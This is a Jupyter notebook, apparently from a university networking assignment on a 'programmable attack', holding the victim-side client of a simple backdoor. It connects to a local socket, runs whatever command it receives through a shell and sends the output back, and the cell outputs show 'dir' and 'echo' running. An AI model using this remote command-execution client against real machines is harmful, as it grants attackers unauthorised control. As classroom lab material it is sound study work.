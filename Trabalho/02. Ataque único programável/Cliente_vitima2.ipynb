{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import subprocess\n",
    "import shlex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Received b'dir'\n",
      "b' O volume na unidade C n\\xc6o tem nome.\\r\\n O N\\xa3mero de S\\x82rie do Volume \\x82 E24F-8D8F\\r\\n\\r\\n Pasta de C:\\\\Users\\\\Acer\\\\OneDrive\\\\Documentos\\\\01. USP\\\\01 - Semestre Atual\\\\Redes\\\\Trabalho 2 - Lu\\xa1s\\\\Trabalho\\\\02. Ataque \\xa3nico program\\xa0vel\\r\\n\\r\\n29/11/2020  17:50    <DIR>          .\\r\\n29/11/2020  17:50    <DIR>          ..\\r\\n26/11/2020  17:33    <DIR>          .ipynb_checkpoints\\r\\n29/11/2020  17:46             3.817 Cliente_vitima2.ipynb\\r\\n29/11/2020  17:50             3.544 Hacker_server2.ipynb\\r\\n               2 arquivo(s)          7.361 bytes\\r\\n               3 pasta(s)   862.255.480.832 bytes dispon\\xa1veis\\r\\n'\n"
     ]
    }
   ],
   "source": [
    "HOST = 'localhost' # The remote host\n",
    "PORT = 10400 # The same port as used by the server\n",
    "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "  s.connect((HOST, PORT))\n",
    "  data = s.recv(1024)\n",
    "  print('Received', repr(data))\n",
    "  cmd = data.decode(\"utf-8\")\n",
    "  args = shlex.split(cmd)\n",
    "  process = subprocess.Popen(args,\n",
    "    stdout=subprocess.PIPE,\n",
    "    stderr=subprocess.PIPE,\n",
    "    shell=True\n",
    "  )\n",
    "  stdout = process.communicate()[0]\n",
    "  print(stdout)\n",
    "  s.sendall(stdout)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Received b'echo 10333567'\n",
      "b'10333567\\r\\n'\n"
     ]
    }
   ],
   "source": [
    "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "  s.connect((HOST, PORT))\n",
    "  data = s.recv(1024)\n",
    "  print('Received', repr(data))\n",
    "  cmd = data.decode(\"utf-8\")\n",
    "  args = shlex.split(cmd)\n",
    "  process = subprocess.Popen(args,\n",
    "    stdout=subprocess.PIPE,\n",
    "    stderr=subprocess.PIPE,\n",
    "    shell=True\n",
    "  )\n",
    "  stdout = process.communicate()[0]\n",
    "  print(stdout)\n",
    "  s.sendall(stdout)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Received b'\"num\"'\n",
      "b''\n"
     ]
    }
   ],
   "source": [
    "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "  s.connect((HOST, PORT))\n",
    "  data = s.recv(1024)\n",
    "  print('Received', repr(data))\n",
    "  cmd = data.decode(\"utf-8\")\n",
    "  args = shlex.split(cmd)\n",
    "  process = subprocess.Popen(args,\n",
    "    stdout=subprocess.PIPE,\n",
    "    stderr=subprocess.PIPE,\n",
    "    shell=True\n",
    "  )\n",
    "  stdout = process.communicate()[0]\n",
    "  print(stdout)\n",
    "  s.sendall(stdout)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
